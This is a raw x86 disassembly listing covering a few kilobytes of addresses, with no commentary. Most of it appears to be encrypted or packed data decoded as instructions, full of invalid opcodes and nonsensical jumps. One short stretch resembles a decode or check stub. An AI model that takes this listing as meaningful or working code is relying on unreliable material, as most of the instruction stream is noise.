  4167a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a7:	add    ebp,eax
  4167a9:	add    ecx,DWORD PTR [ebx]
  4167ab:	cld    
  4167ac:	sub    DWORD PTR [ecx+0x2f177690],0x83f01e9c
  4167b6:	jne    0x416749
  4167b8:	inc    ecx
  4167b9:	xchg   edx,eax
  4167ba:	pop    ss
  4167bb:	bound  edx,QWORD PTR [ebx*2+0x46af0c35]
  4167c2:	adc    eax,0x129dd165
  4167c7:	dec    eax
  4167c8:	(bad)  
  4167c9:	shr    BYTE PTR [eax-0x21e61ff0],cl
  4167cf:	and    eax,0x82a05670
  4167d4:	pop    ss
  4167d5:	or     al,0x6a
  4167d7:	sbb    bl,BYTE PTR [edi-0x65]
  4167da:	scas   eax,DWORD PTR es:[edi]
  4167db:	pop    ss
  4167dc:	pop    es
  4167dd:	sbb    DWORD PTR [esi],esi
  4167df:	add    esi,DWORD PTR [ebx+esi*2+0xb]
  4167e3:	jp     0x4167b6
  4167e5:	in     al,0xa5
  4167e7:	or     DWORD PTR [ecx],esi
  4167e9:	mov    edx,0x9b9af526
  4167ee:	cli    
  4167ef:	leave  
  4167f0:	lods   eax,DWORD PTR ds:[esi]
  4167f1:	jge    0x4167a0
  4167f3:	jecxz  0x416870
  4167f5:	loopne 0x416862
  4167f7:	inc    edx
  4167f8:	push   ebp
  4167f9:	mov    esi,0x8911d89a
  4167fe:	add    DWORD PTR [ebx+0x18e9f845],ecx
  416804:	or     eax,DWORD PTR [eax]
  416806:	add    cl,ch
  416808:	mov    bl,0x2
  41680a:	add    BYTE PTR [eax],al
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	mov    dh,0x57
  41681a:	mov    edx,0x7f23769e
  41681f:	js     0x4167b6
  416821:	jle    0x41689b
  416823:	js     0x4167d0
  416825:	test   eax,0x2af2aaba
  41682a:	xor    DWORD PTR [eax-0xe],esp
  41682d:	data16 jl 0x4167bc
  416830:	push   0xf1465705
  416835:	bound  ebx,QWORD PTR [ecx-0x53]
  416838:	jle    0x416857
  41683a:	fnsave [ebx+0x60450186]
  416840:	hlt    
  416841:	xor    BYTE PTR [ebx-0x370fea42],ch
  416847:	mov    ebp,0x6d336f39
  41684c:	sub    eax,0x53d87807
  416851:	xchg   esi,eax
  416852:	pop    eax
  416853:	pop    es
  416854:	xor    al,0x21
  416856:	push   ss
  416857:	adc    BYTE PTR [ebp+0x64593249],cl
  41685d:	aas    
  41685e:	mov    ebp,0x2c59f2af
  416863:	mov    esp,0xcce4ef55
  416868:	icebp  
  416869:	push   0x2f
  41686b:	cmp    ecx,DWORD PTR [edi-0x79e08b7b]
  416871:	outs   dx,DWORD PTR ds:[esi]
  416872:	lock (bad) 
  416874:	mov    bl,0x9d
  416876:	mov    WORD PTR ss:[eax+ecx*4],?
  41687a:	mov    ecx,0x63b5e157
  41687f:	pop    eax
  416880:	call   0xb0a61c5d
  416885:	dec    esi
  416886:	xor    eax,0x279bdc76
  41688b:	stos   DWORD PTR es:[edi],eax
  41688c:	repnz out dx,al
  41688e:	icebp  
  41688f:	pop    ss
  416890:	ins    BYTE PTR es:[edi],dx
  416891:	or     bh,BYTE PTR [edi-0x19]
  416894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416895:	mov    ch,0xc6
  416897:	lock (bad) 
  416899:	stc    
  41689a:	daa    
  41689b:	imul   ebp,DWORD PTR [ebx],0xaeb09326
  4168a1:	jns    0x4168f9
  4168a3:	add    al,0x7a
  4168a5:	add    eax,0x2e8c82e0
  4168aa:	add    bl,ch
  4168ac:	cmp    al,0xa6
  4168ae:	pop    ss
  4168af:	cmp    dh,BYTE PTR [eax-0x12]
  4168b2:	xchg   ecx,eax
  4168b3:	(bad)  
  4168b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b5:	jmp    0x3f61:0xa44ea0c8
  4168bc:	push   ecx
  4168bd:	mov    esi,0x45c5a699
  4168c2:	std    
  4168c3:	stos   DWORD PTR es:[edi],eax
  4168c4:	mov    DWORD PTR [edx+0x6e58a5a5],eax
  4168ca:	pop    esi
  4168cb:	add    eax,0x5dfaa47c
  4168d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168d1:	mov    bl,0x47
  4168d3:	sbb    BYTE PTR [bp+di-0x40a9],ah
  4168d8:	mov    ds:0xa1fd0f32,al
  4168dd:	add    BYTE PTR [edi],al
  4168df:	loopne 0x416935
  4168e1:	mov    edx,0x74b9cab
  4168e6:	jbe    0x416878
  4168e8:	rcl    BYTE PTR [edi+0x77498954],0x29
  4168ef:	adc    DWORD PTR [ebx+0x1c],esi
  4168f2:	cdq    
  4168f3:	xor    al,0x9b
  4168f5:	(bad)  
  4168f6:	jmp    0xaa5b:0xbb488406
  4168fd:	push   es
  4168fe:	inc    esp
  4168ff:	jl     0x4168b4
  416901:	add    cl,BYTE PTR [edi+eiz*8]
  416904:	xchg   edx,eax
  416905:	dec    esp
  416906:	aam    0xeb
  416908:	shl    DWORD PTR [ebp+0x4],1
  41690b:	push   esi
  41690c:	mov    bl,0xf3
  41690e:	test   eax,0x9572466e
  416913:	push   esi
  416914:	and    edx,ecx
  416916:	inc    ebx
  416917:	inc    ecx
  416918:	jns    0x41689d
  41691a:	sti    
  41691b:	mov    ecx,0x8058c00
  416920:	jnp    0x4168f5
  416922:	ror    DWORD PTR [ecx],cl
  416924:	rcr    BYTE PTR [ebx-0x11],0x71
  416928:	(bad)  
  41692a:	xchg   ebx,eax
  41692b:	cmp    eax,0xe72d41a
  416930:	inc    ecx
  416931:	mov    ds:0x6fe91acb,al
  416936:	adc    al,0xe8
  416938:	or     edi,edi
  41693a:	call   DWORD PTR ds:0xaa72ead1
  416940:	repz jmp 0x41690f
  416943:	mov    ebp,edi
  416945:	and    esp,DWORD PTR [eax-0x438522cd]
  41694b:	(bad)  
  41694c:	push   ecx
  41694d:	adc    ebx,DWORD PTR [eax+0x3ee61aa8]
  416953:	mov    esi,0x9cf3dd8e
  416958:	test   eax,0xedb2d8a4
  41695d:	call   0x61c2ea96
  416962:	sbb    ah,BYTE PTR [ecx+0x7126fe3f]
  416968:	loope  0x4169c3
  41696a:	mov    al,ds:0x6f2acb12
  41696f:	mov    dh,0xbf
  416971:	xchg   ecx,eax
  416972:	push   es
  416973:	sub    dl,dl
  416975:	jmp    0x416955
  416977:	clc    
  416978:	lods   eax,DWORD PTR ds:[esi]
  416979:	clc    
  41697a:	jbe    0x416940
  41697c:	ss pop ds
  41697e:	lods   al,BYTE PTR ds:[esi]
  41697f:	push   ds
  416980:	pop    ds
  416981:	jno    0x41693f
  416983:	test   BYTE PTR [esi-0x69213967],0x3b
  41698a:	out    0x84,al
  41698c:	in     al,dx
  41698d:	call   0x638:0xb4d5ecb6
  416994:	lock and eax,0x3e84ba7b
  41699a:	sub    DWORD PTR [edx+edi*8-0x14c94f89],eax
  4169a1:	mov    dh,0x56
  4169a3:	inc    edi
  4169a4:	setae  BYTE PTR fs:[edi+0x30]
  4169a9:	cs clc 
  4169ab:	xchg   DWORD PTR [edi+0x7469285b],esp
  4169b1:	dec    edi
  4169b2:	xor    DWORD PTR [esp+edx*4],edi
  4169b5:	cwde   
  4169b6:	inc    esp
  4169b7:	fistp  WORD PTR [esi-0x4c4f07e6]
  4169bd:	mul    DWORD PTR [esi]
  4169bf:	sub    DWORD PTR [edx+0x3a791025],eax
  4169c5:	mov    esp,0xa8cab6dc
  4169ca:	pcmpeqw mm1,QWORD PTR [ecx-0xc7946dc]
  4169d1:	sub    esp,ebx
  4169d3:	dec    ecx
  4169d4:	jb     0x4169de
  4169d6:	(bad)  
  4169d7:	dec    ebx
  4169d8:	adc    al,0x8
  4169da:	dec    esp
  4169db:	pop    ebx
  4169dc:	out    dx,eax
  4169dd:	mov    eax,ds:0xe1784424
  4169e2:	imul   ebp,DWORD PTR [edi+0x6a],0xee2ceae7
  4169e9:	ret    
  4169ea:	mov    dl,0xd3
  4169ec:	dec    ebx
  4169ed:	(bad)  
  4169ee:	mov    ah,0x53
  4169f0:	dec    edx
  4169f1:	or     ah,BYTE PTR [esi-0x40d7e6db]
  4169f7:	add    al,0x79
  4169f9:	adc    edx,edx
  4169fb:	and    DWORD PTR [ebp-0x65],edi
  4169fe:	retf   0x575d
  416a01:	or     eax,0x88098202
  416a06:	fsub   QWORD PTR [eax+0x57]
  416a09:	adc    BYTE PTR [edx+0x5957d5fd],bh
  416a0f:	mov    eax,0xb97bbec4
  416a14:	push   ds
  416a15:	dec    ebx
  416a16:	mov    DWORD PTR [ebp+0x35],eax
  416a19:	cli    
  416a1a:	sbb    cl,ch
  416a1c:	imul   ebx,DWORD PTR [ecx+esi*8+0x71],0xffffffb9
  416a21:	xchg   edi,eax
  416a22:	stc    
  416a23:	loopne 0x416a7e
  416a25:	fnstsw WORD PTR [ebp+0x48]
  416a28:	jp     0x416a69
  416a2a:	xor    BYTE PTR [esi+0x5d195adb],0x94
  416a31:	inc    esi
  416a32:	es cdq 
  416a34:	and    ah,BYTE PTR [ebp+0x70175697]
  416a3a:	stos   DWORD PTR es:[edi],eax
  416a3b:	scas   al,BYTE PTR es:[edi]
  416a3c:	icebp  
  416a3d:	push   edx
  416a3e:	jne    0x4169f4
  416a40:	inc    esp
  416a41:	mov    ah,0x83
  416a43:	fcmovne st,st(4)
  416a45:	(bad)  
  416a46:	test   esi,edx
  416a48:	push   esp
  416a49:	call   0x228c:0xc75dd06d
  416a50:	scas   al,BYTE PTR es:[edi]
  416a51:	in     eax,0xc0
  416a53:	inc    esi
  416a54:	and    DWORD PTR [edi-0xb3a6268],0x23
  416a5b:	cmp    dl,BYTE PTR [ecx-0x3fa0c30b]
  416a61:	jge    0x4169e5
  416a63:	jbe    0x416a0e
  416a65:	mov    eax,ds:0x53b06303
  416a6a:	add    al,0x9b
  416a6c:	push   esp
  416a6d:	sub    al,0xa5
  416a6f:	cmp    eax,DWORD PTR [eax+0x2820c858]
  416a75:	sbb    BYTE PTR [ecx+0x7b710dbc],ah
  416a7b:	shl    DWORD PTR [eax+0x3b],1
  416a7e:	pop    edx
  416a7f:	cli    
  416a80:	cmp    BYTE PTR [eax-0x35],bh
  416a83:	retf   0x71f3
  416a86:	je     0x416a4b
  416a88:	adc    eax,ebp
  416a8a:	fadd   DWORD PTR [ebx+0x6f60b2e0]
  416a90:	inc    ecx
  416a91:	aam    0xe7
  416a93:	sub    al,0xf7
  416a95:	mov    edx,0x2768f5ae
  416a9a:	cmp    BYTE PTR [esi+esi*2],cl
  416a9d:	cmc    
  416a9e:	js     0x416a32
  416aa0:	scas   al,BYTE PTR es:[edi]
  416aa1:	push   0xffffffa7
  416aa3:	rol    BYTE PTR [edx],cl
  416aa5:	adc    esi,DWORD PTR [edx+0x784af34a]
  416aab:	jb     0x416af5
  416aad:	adc    ch,BYTE PTR [esi+eiz*1]
  416ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab1:	mov    ch,0x6
  416ab3:	mov    dh,0x53
  416ab5:	pop    ds
  416ab6:	inc    eax
  416ab7:	push   edx
  416ab8:	mov    fs,WORD PTR [esi]
  416aba:	xchg   ebx,eax
  416abb:	inc    esp
  416abc:	pop    ebx
  416abd:	mov    esi,0xfc458b16
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xfc64ff75
  416ad4:	sbb    eax,0x20930962
  416ad9:	jg     0x416b53
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b26
  416ae0:	sbb    eax,0x703e11f9
  416ae5:	xor    edi,DWORD PTR [edi]
  416ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae8:	add    al,0xc9
  416aea:	retf   0x9fc5
  416aed:	xchg   DWORD PTR [ecx+0x21fe2bcf],esp
  416af3:	sbb    dh,BYTE PTR [edx-0x5d210f8e]
  416af9:	add    al,0x15
  416afb:	sub    ah,BYTE PTR [esi-0x2a469764]
  416b01:	xchg   edi,eax
  416b02:	adc    BYTE PTR [edi-0x17],al
  416b05:	push   0xffffffca
  416b07:	in     eax,0x15
  416b09:	in     eax,0xc5
  416b0b:	pop    esi
  416b0c:	push   0x444cfcd
  416b11:	rcr    BYTE PTR [edi+0x2328109c],0x90
  416b18:	adc    al,0x5b
  416b1a:	pop    ecx
  416b1b:	pop    eax
  416b1c:	fcomp  QWORD PTR [edx-0x17]
  416b1f:	push   es
  416b20:	adc    dh,BYTE PTR [ebx]
  416b22:	shl    DWORD PTR [edx-0x60],1
  416b25:	or     bl,BYTE PTR [ebx-0x49671181]
  416b2b:	mov    esi,0xe6ffe050
  416b30:	jmp    0x678cb8a7
  416b35:	dec    ebx
  416b36:	xchg   edx,eax
  416b37:	push   ss
  416b38:	loope  0x416b02
  416b3a:	test   al,0xaf
  416b3c:	xor    ebx,DWORD PTR es:[esi-0x3e]
  416b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b41:	mov    ds:0xe17aaa75,al
  416b46:	fdivr  DWORD PTR [edx-0x432305e8]
  416b4c:	je     0x416b85
  416b4e:	mov    ecx,0x16166fed
  416b53:	retf   
  416b54:	push   0x497b24a4
  416b59:	std    
  416b5a:	daa    
  416b5b:	cs mov cl,0x9
  416b5e:	sbb    bl,BYTE PTR [edi-0x5a]
  416b61:	push   es
  416b62:	in     al,0x69
  416b64:	mov    bl,0x15
  416b66:	(bad)  [edx]
  416b68:	ficomp WORD PTR [edi+ecx*4-0x52feab26]
  416b6f:	cmp    DWORD PTR [ebp-0x7b],esp
  416b72:	imul   esp,DWORD PTR [ebp-0x72],0xa833b59e
  416b79:	(bad)  
  416b7a:	retf   0xd6a8
  416b7d:	mov    bl,al
  416b7f:	popf   
  416b80:	and    BYTE PTR [eax],bl
  416b82:	jp     0x416bfd
  416b84:	loope  0x416b8a
  416b86:	cdq    
  416b87:	cmp    eax,0xda27425d
  416b8c:	jle    0x416bae
  416b8e:	push   esp
  416b8f:	cld    
  416b90:	fisubr DWORD PTR [ebx]
  416b92:	das    
  416b93:	lds    edi,FWORD PTR [ecx-0x1c]
  416b96:	jl     0x416bcf
  416b98:	(bad)  
  416b99:	shl    DWORD PTR [ebx+0x52ab605f],cl
  416b9f:	test   BYTE PTR [edi+0x7a596a96],bl
  416ba5:	cld    
  416ba6:	xchg   edi,eax
  416ba7:	mov    ecx,0xa09b83ef
  416bac:	xchg   edi,eax
  416bad:	jle    0x416bf3
  416baf:	adc    dl,ah
  416bb1:	lods   al,BYTE PTR ds:[esi]
  416bb2:	not    BYTE PTR [esp+esi*8+0x6d]
  416bb6:	jecxz  0x416b67
  416bb8:	aam    0x6c
  416bba:	inc    edi
  416bbb:	les    edx,FWORD PTR [ebp-0x47]
  416bbe:	fwait
  416bbf:	xor    ch,bh
  416bc1:	pop    ebp
  416bc2:	xor    eax,DWORD PTR [esi-0x1e]
  416bc5:	mov    ah,0xa7
  416bc7:	adc    DWORD PTR [ebx-0x2a],eax
  416bca:	ss push ss
  416bcc:	shl    BYTE PTR [edi-0x7],0x22
  416bd0:	mov    eax,0x418e2725
  416bd5:	jne    0x416bd5
  416bd7:	jmp    DWORD PTR [eax]
  416bd9:	or     al,0x4e
  416bdb:	(bad)  
  416bdc:	or     al,0x76
  416bde:	mov    ch,0xf4
  416be0:	clc    
  416be1:	sbb    BYTE PTR [esp+eiz*8-0x69317204],ah
  416be8:	push   esp
  416be9:	mov    eax,DWORD PTR [eax]
  416beb:	ficom  WORD PTR [eax+0x32049fc]
  416bf1:	sub    al,0x45
  416bf3:	xor    al,BYTE PTR [edi+0x11]
  416bf6:	in     al,0xc
  416bf8:	dec    esi
  416bf9:	jno    0x416bff
  416bfb:	cs sbb al,dl
  416bfe:	sub    al,bh
  416c00:	dec    esp
  416c01:	adc    al,0x7a
  416c03:	pop    es
  416c04:	jbe    0x416bc5
  416c06:	retf   
  416c07:	stos   WORD PTR es:[edi],ax
  416c09:	jb     0x416c7f
  416c0b:	mov    bl,0x19
  416c0d:	jno    0x416c06
  416c0f:	push   ebx
  416c10:	mov    ebx,0xca8dc242
  416c15:	clc    
  416c16:	sbb    eax,0xd1c304cf
  416c1b:	in     al,0x86
  416c1d:	xor    BYTE PTR [esp+eax*8+0x4d75c428],ah
  416c24:	jmp    0x416c2f
  416c26:	call   0xa9f56089
  416c2b:	cdq    
  416c2c:	sahf   
  416c2d:	pop    ebp
  416c2e:	mov    ah,0x68
  416c30:	lods   eax,DWORD PTR ds:[esi]
  416c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c32:	jmp    0x213b:0xdb6dd8b0
  416c39:	call   0x30c8:0xf1b0fc85
  416c40:	cmp    al,0xc
  416c42:	es jp  0x416c8d
  416c45:	iret   
  416c46:	jns    0x416c41
  416c48:	cmp    ebx,edx
  416c4a:	sub    eax,DWORD PTR [ebx-0x58d3e378]
  416c50:	push   0xca97b440
  416c55:	daa    
  416c56:	cmp    dh,BYTE PTR [edx+eiz*4]
  416c59:	sub    ebp,0xefabcd9c
  416c5f:	add    al,BYTE PTR [edi]
  416c61:	push   edi
  416c62:	mov    DWORD PTR [esi-0x781fba85],0x64862686
  416c6c:	rol    BYTE PTR [ebp+0x3d],1
  416c6f:	cmp    al,0xe5
  416c71:	push   0x7970bee5
  416c76:	ret    0x9ed4
  416c79:	pop    ebx
  416c7a:	into   
  416c7b:	or     eax,DWORD PTR [ecx-0x75805828]
  416c81:	out    dx,eax
  416c82:	xor    al,0x8
  416c84:	mov    esi,0x801c3b81
  416c89:	lock xchg esi,eax
  416c8b:	and    dl,dh
  416c8d:	inc    ebp
  416c8e:	push   ss
  416c8f:	js     0x416c9f
  416c91:	mov    edx,0x7a3f6edf
  416c96:	sbb    edx,eax
  416c98:	sbb    BYTE PTR [eax-0x33d5b63a],dl
  416c9e:	pop    ecx
  416c9f:	das    
  416ca0:	dec    ebx
  416ca1:	xchg   ecx,eax
  416ca2:	aam    0xd0
  416ca4:	push   cs
  416ca5:	jnp    0x416ca4
  416ca7:	mov    ch,0x5c
  416ca9:	std    
  416caa:	mov    ah,0xc0
  416cac:	popf   
  416cad:	xchg   edi,eax
  416cae:	es and al,0x44
  416cb1:	mov    ah,0xac
  416cb3:	out    0x42,eax
  416cb5:	retf   
  416cb6:	sti    
  416cb7:	fistp  DWORD PTR [ebx]
  416cb9:	sar    ecx,1
  416cbb:	je     0x416c65
  416cbd:	into   
  416cbe:	jne    0x416d3a
  416cc0:	push   edi
  416cc1:	or     al,0x86
  416cc3:	rcr    DWORD PTR [ebx+0x8],cl
  416cc6:	stc    
  416cc7:	dec    esi
  416cc8:	or     bh,BYTE PTR [ecx+ebp*1]
  416ccb:	dec    ebp
  416ccc:	loop   0x416ce7
  416cce:	sbb    al,0xe3
  416cd0:	mov    al,0x40
  416cd2:	mov    cx,0x66f6
  416cd6:	push   esp
  416cd7:	push   es
  416cd8:	iret   
  416cd9:	out    0xa7,al
  416cdb:	adc    al,0x28
  416cdd:	(bad)  
  416cde:	lahf   
  416cdf:	(bad)  
  416ce0:	call   0x6c446428
  416ce5:	ficomp WORD PTR [ecx+0x3a]
  416ce8:	repz jae 0x416ce7
  416ceb:	jbe    0x416d5b
  416ced:	sbb    BYTE PTR [ecx-0x7a],0xc1
  416cf1:	mov    dh,BYTE PTR [esi-0x38]
  416cf4:	cmp    DWORD PTR [eax+0x5095abd1],ebp
  416cfa:	(bad)  
  416cfb:	xlat   BYTE PTR ds:[ebx]
  416cfc:	lock adc esp,DWORD PTR [edi+0x6bf59f65]
  416d03:	mov    eax,ds:0xe6e0dedf
  416d08:	into   
  416d09:	repz sub dl,BYTE PTR ds:0x4375d531
  416d10:	lock (bad) [esp+ecx*1-0x3b00c9ae]
  416d18:	je     0x416cde
  416d1a:	mov    ebx,0xc150cf31
  416d1f:	jo     0x416d98
  416d21:	cmc    
  416d22:	fadd   DWORD PTR [ecx-0x3f0c12c3]
  416d28:	inc    eax
  416d29:	fsub   QWORD PTR [ebp-0x62]
  416d2c:	gs pusha 
  416d2e:	add    ecx,DWORD PTR [edx-0x748d7bdd]
  416d34:	fnstenv [esi+0xa]
  416d37:	sbb    DWORD PTR [esi-0x60],edi
  416d3a:	(bad)  
  416d3b:	inc    ecx
  416d3c:	lods   al,BYTE PTR ds:[esi]
  416d3d:	pusha  
  416d3e:	call   0x61a9024f
  416d43:	out    0x3f,eax
  416d45:	and    ecx,DWORD PTR [ecx+0x763fd31e]
  416d4b:	jle    0x416d23
  416d4d:	cld    
  416d4e:	jp     0x416cf1
  416d50:	pop    ss
  416d51:	mov    cl,0x29
  416d53:	dec    edi
  416d54:	out    dx,eax
  416d55:	shl    ah,cl
  416d57:	repnz rol DWORD PTR [ecx],0xea
  416d5b:	fs inc edx
  416d5d:	mov    bl,bl
  416d5f:	loop   0x416d22
  416d61:	call   0x73ba755e
  416d66:	leave  
  416d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d68:	add    bh,BYTE PTR [ebp-0x2e]
  416d6b:	aad    0xc6
  416d6d:	stos   BYTE PTR es:[edi],al
  416d6e:	(bad)  
  416d6f:	cs retf 
  416d71:	xor    BYTE PTR [ecx],bh
  416d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d74:	rcr    DWORD PTR [edx],0xf1
  416d77:	adc    ecx,DWORD PTR [ebp+0x104d8bc8]
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x9eda:0xd3981efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	ds ret 0x4b2c
  416dbb:	std    
  416dbc:	ja     0x416dc9
  416dbe:	ja     0x416db8
  416dc0:	rcl    eax,cl
  416dc2:	pusha  
  416dc3:	xchg   ebp,eax
  416dc4:	jmp    0x99c6:0x6ab9ab34
  416dcb:	bound  esi,QWORD PTR [ebx-0x24fea16f]
  416dd1:	pop    ecx
  416dd2:	xchg   ebp,eax
  416dd3:	(bad)
  416dd7:	cmp    BYTE PTR [esi+0x69],ch
  416dda:	rcl    BYTE PTR [edi+ebp*1-0x39],cl
  416dde:	retf   0xccda
  416de1:	pusha  
  416de2:	out    0x49,eax
  416de4:	xchg   esi,eax
  416de5:	adc    DWORD PTR [ebx-0xd4394d],esp
  416deb:	ficomp DWORD PTR [ebx+eax*8-0x10]
  416def:	dec    ecx
  416df0:	push   ds
  416df1:	pop    esi
  416df2:	ins    BYTE PTR es:[edi],dx
  416df3:	cmc    
  416df4:	jbe    0x416da3
  416df6:	not    BYTE PTR [edx+esi*2-0x1]
  416dfa:	pop    ebx
  416dfb:	jnp    0x416db2
  416dfd:	sub    eax,DWORD PTR [eax+0x35]
  416e00:	jo     0x416e12
  416e02:	cwde   
  416e03:	adc    BYTE PTR [ebx],bh
  416e05:	jbe    0x416e49
  416e07:	pusha  
  416e08:	mov    DWORD PTR [ebx-0x3d],0xa9a62f57
  416e0f:	xchg   bl,al
  416e11:	lods   eax,DWORD PTR ds:[esi]
  416e12:	mov    al,0xd
  416e14:	nop
  416e15:	jnp    0x416dae
  416e17:	pop    ss
  416e18:	xchg   ebx,eax
  416e19:	sbb    BYTE PTR ds:0x6d2213d1,ch
  416e20:	inc    ebx
  416e21:	call   0xb1d80d33
  416e26:	mov    eax,0xc50b7686
  416e2b:	ret    0x490c
  416e2e:	add    cl,BYTE PTR [ecx+eiz*1+0x1e]
  416e32:	adc    cl,BYTE PTR [esi+0x66486cd2]
  416e38:	add    al,0xc5
  416e3a:	ins    DWORD PTR es:[edi],dx
  416e3b:	lods   eax,DWORD PTR ds:[esi]
  416e3c:	adc    eax,0xe919c89a
  416e41:	pushf  
  416e42:	into   
  416e43:	and    esi,DWORD PTR [ebp+0xdd9208c]
  416e49:	shl    DWORD PTR [ecx-0x6214786a],1
  416e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e50:	mov    eax,0xb02e10ef
  416e55:	mov    edi,0x8d65f691
  416e5a:	nop
  416e5b:	adc    DWORD PTR [ebx+0x65c3ec85],edx
  416e61:	mov    ebp,0x986c1c04
  416e66:	push   edi
  416e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e68:	cli    
  416e69:	mov    esp,0x52e79c73
  416e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e6f:	xchg   ebp,eax
  416e70:	inc    esi
  416e71:	adc    eax,0xc54d3ff0
  416e76:	div    ch
  416e78:	xchg   ebp,eax
  416e79:	mov    edx,0x6d61d649
  416e7e:	mov    ebx,0x78ffa54d
  416e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e84:	pop    es
  416e85:	stc    
  416e86:	push   esp
  416e87:	aas    
  416e88:	inc    ebp
  416e89:	outs   dx,DWORD PTR ds:[esi]
  416e8a:	mov    ebp,0x369a26a
  416e8f:	ror    al,1
  416e91:	xor    DWORD PTR [esi-0x61],edi
  416e94:	mov    edx,0xd04c2a7c
  416e99:	clc    
  416e9a:	es pop esp
  416e9c:	sti    
  416e9d:	and    DWORD PTR [ebp-0x3e883c7c],ecx
  416ea3:	(bad)  
  416ea5:	mov    ecx,0x4f1228be
  416eaa:	or     BYTE PTR [eax-0x2d],dl
  416ead:	xchg   ebp,eax
  416eae:	jmp    0x85b1:0xad48508d
  416eb5:	clc    
  416eb6:	dec    edi
  416eb7:	pop    esi
  416eb8:	dec    ebp
  416eb9:	call   0xacaa:0x8454e740
  416ec0:	add    eax,0xd57028db
  416ec5:	(bad)  [ecx-0x4d123c23]
  416ecb:	sub    ebx,DWORD PTR [edi+0x72]
  416ece:	hlt    
  416ecf:	fdiv   DWORD PTR [edi]
  416ed1:	jl     0x416eea
  416ed3:	fistp  QWORD PTR [edx+0x7445bcd2]
  416ed9:	pop    edx
  416eda:	mov    BYTE PTR fs:[edi+0x650b87f7],bl
  416ee1:	int    0x24
  416ee3:	push   0x10
  416ee5:	mov    esp,0xd69b6bd
  416eea:	xlat   BYTE PTR ds:[ebx]
  416eeb:	jle    0x416ee3
  416eed:	xchg   edi,eax
  416eee:	mov    cs,WORD PTR [esi-0x388b8163]
  416ef4:	mov    al,0xa6
  416ef6:	xchg   BYTE PTR [ecx+0x51a612f0],al
  416efc:	cwde   
  416efd:	ins    BYTE PTR es:[edi],dx
  416efe:	bound  esp,QWORD PTR [ebx+0x52]
  416f01:	xchg   edx,eax
  416f02:	retf   0xabe1
  416f05:	dec    ebp
  416f06:	mov    WORD PTR [esi+0x1dd5b719],gs
  416f0c:	mov    DWORD PTR [esi+0x39],edi
  416f0f:	das    
  416f10:	and    eax,0x818291b4
  416f15:	push   esi
  416f16:	in     eax,0x16
  416f18:	dec    edx
  416f19:	jae    0x416ec9
  416f1b:	jne    0x416f5e
  416f1d:	xchg   DWORD PTR [ecx+0x699a08d9],ebp
  416f23:	push   0x7e1bee37
  416f28:	arpl   WORD PTR [edx+0x4e9ed35c],bx
  416f2e:	sub    BYTE PTR [esi+0x2f],ch
  416f31:	mov    BYTE PTR fs:[ebx-0x44a25cef],ah
  416f38:	or     DWORD PTR [ebx-0x6f],edx
  416f3b:	ret    0xe0ca
  416f3e:	and    esi,DWORD PTR [ecx-0x3c]
  416f41:	outs   dx,DWORD PTR ds:[esi]
  416f42:	in     eax,dx
  416f43:	int3   
  416f44:	test   al,0xeb
  416f46:	fnstsw WORD PTR [edi-0x83a4b12]
  416f4c:	adc    BYTE PTR [ebx+0x5a520858],al
  416f52:	dec    esp
  416f53:	sbb    bl,BYTE PTR [ebx-0x9f539d2]
  416f59:	aam    0x5b
  416f5b:	add    al,0xb
  416f5d:	add    eax,0xce79007f
  416f62:	rcr    BYTE PTR ds:0xc7ecf519,1
  416f68:	xor    bh,BYTE PTR [edi]
  416f6a:	fwait
  416f6b:	and    eax,0xbaf2c434
  416f70:	jle    0x416f12
  416f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f73:	mov    ecx,0xa44cba37
  416f78:	push   es
  416f79:	add    al,BYTE PTR [ebx-0x76]
  416f7c:	inc    esp
  416f7d:	in     al,0xcd
  416f7f:	ss or  eax,0x36cdb04b
  416f85:	push   cs
  416f86:	add    edi,DWORD PTR [ebp+esi*8+0x13e9e0ba]
  416f8d:	sbb    BYTE PTR [esi-0x2a8255ee],dh
  416f93:	or     bl,BYTE PTR [esi+0x3d]
  416f96:	ins    BYTE PTR es:[edi],dx
  416f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f98:	(bad)  
  416f99:	test   al,0xee
  416f9b:	jg     0x416f71
  416f9d:	adc    cl,BYTE PTR [esi]
  416f9f:	lds    eax,FWORD PTR [ebp-0x7e]
  416fa2:	pop    eax
  416fa3:	data16 mov cl,0xf3
  416fa6:	inc    ebp
  416fa7:	mov    edx,0x4d173edd
  416fac:	clc    
  416fad:	in     eax,dx
  416fae:	jge    0x417026
  416fb0:	inc    esi
  416fb1:	int3   
